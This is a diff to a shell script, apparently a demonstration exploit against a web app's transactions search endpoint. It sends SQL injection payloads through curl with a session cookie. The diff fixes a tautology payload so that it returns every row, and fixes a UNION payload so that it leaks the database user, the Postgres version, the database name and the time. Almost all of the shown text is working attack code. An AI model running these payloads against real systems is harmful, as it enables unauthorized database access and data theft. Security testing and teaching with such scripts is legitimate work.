@@ -50,20 +50,20 @@ BENIGN=$(curl -sS -b "${COOKIES}" \
 echo "    Response: ${BENIGN}"
 
 echo
-echo "==> Step 3: tautology SQLi — returns all of the user's transactions"
-echo "    Payload: ' OR '1'='1"
+echo "==> Step 3: tautology SQLi — bypasses the WHERE clause, returns every row"
+echo "    Payload: ') OR '1'='1' --"
 TAUTOLOGY=$(curl -sS -b "${COOKIES}" \
     --get "${FRONTEND_URL}/transactions/search" \
-    --data-urlencode "counterparty=' OR '1'='1")
+    --data-urlencode "counterparty=') OR '1'='1' --")
 echo "    Response (first 300 chars):"
 printf '    %s\n' "${TAUTOLOGY:0:300}"
 
 echo
 echo "==> Step 4: UNION exfil — leaks Postgres metadata into the result set"
-echo "    Payload: ') UNION SELECT NULL, current_user, NULL, current_database(), NULL, NULL, NULL--"
+echo "    Payload: ') UNION SELECT 1, current_user, version(), current_database(), NULL, NULL, now() --"
 UNION_RESP=$(curl -sS -b "${COOKIES}" \
     --get "${FRONTEND_URL}/transactions/search" \
-    --data-urlencode "counterparty=') UNION SELECT 1, current_user, version(), current_database(), NULL, now()--")
+    --data-urlencode "counterparty=') UNION SELECT 1, current_user, version(), current_database(), NULL, NULL, now() --")
 echo "    Response:"
 printf '    %s\n' "${UNION_RESP}"
 
